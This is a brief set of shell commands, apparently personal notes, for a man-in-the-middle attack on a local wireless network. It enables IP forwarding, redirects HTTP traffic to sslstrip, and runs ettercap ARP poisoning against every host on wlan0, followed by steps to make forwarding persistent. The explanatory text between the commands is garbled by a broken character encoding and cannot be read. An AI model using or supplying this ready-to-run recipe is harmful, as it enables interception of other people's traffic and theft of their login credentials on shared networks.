echo "1">/proc/sys/net/ipv4/ip_forward

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

sslstrip -l 10000

ettercap -T -q -i wlan0 -M arp:remote // //

Ҫ���ÿ���·�ɹ��ܾ͵õ����ں˲����ˣ�Ҳͦ�򵥣�
vim /etc/sysctl.conf
�ҵ�������һ�У���ǰ���#��ɾ�����ɣ��е��ǰѡ�=0���ĳɡ�=1��
net.ipv4.ip_forward=1

��ִ�У�sysctl -p��ʹ�ں˲�����ʱ��Ч��
